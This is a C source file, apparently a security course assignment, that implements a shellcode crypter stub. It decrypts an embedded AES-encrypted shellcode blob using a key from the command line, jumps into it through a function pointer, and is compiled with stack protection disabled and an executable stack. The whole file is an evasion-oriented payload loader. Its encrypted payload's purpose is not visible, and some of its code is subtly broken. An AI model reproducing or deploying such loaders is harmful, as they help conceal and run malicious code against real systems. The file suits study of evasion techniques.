/*
* SLAE Assigment 7 - Custom encrypter
* Author: rtmcx (rtmcx@protonmail.com)
* Decodes a shellcode with ase256 and key provided from the commandline
* 
   Must have libgcrypt installed, "sudo apt install libgcrypt20-dev"
   Compile with: 
        gcc -lgcrypt -fno-stack-protector -z execstack decoder.c -o decoder
*/


#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <gcrypt.h>

uint8_t encryptedShellCode[] = 
"\x61\xe5\x83\xea\x65\x32\xf4\xd4\xf3\x47\x49\x38\xc6\xad\xc3\x4a\x84\xfe\xe2\x1c\xe3\x09\x19\xed\x3a";

uint8_t initVector[16] = {0x0A}; //Set the initialization vector

static void decrypter(int algorithm, size_t len, uint8_t *buffer, char* key){

    gcry_cipher_hd_t hd;
    gcry_cipher_open(&hd, algorithm, GCRY_CIPHER_MODE_OFB, 0);
    gcry_cipher_setkey(hd, key, 16);
    gcry_cipher_setiv(hd, initVector, 16);

    gcry_cipher_decrypt(hd, buffer, len, encryptedShellCode, len);
    gcry_cipher_close(hd);
}

int main(int argc, char* argv[])
{
    if (argc < 2)
    {
        printf("[!] No key provided.\n");
        printf("usage: %s <KEY>\n", argv[0]);
        return 0;
    }
    char* key = argv[1];

    int ag = gcry_cipher_map_name("aes256");

    printf("Decrypting shellcode using key '%s':\n", key);

    size_t len = strlen(encryptedShellCode);
    uint8_t *buffer = malloc(len);

    decrypter(ag, len, buffer, key);	

    int (*ret)() = (int(*)())buffer;
    printf("Running shellcode...\n");
    ret();

    free(buffer);
    return 0;
}
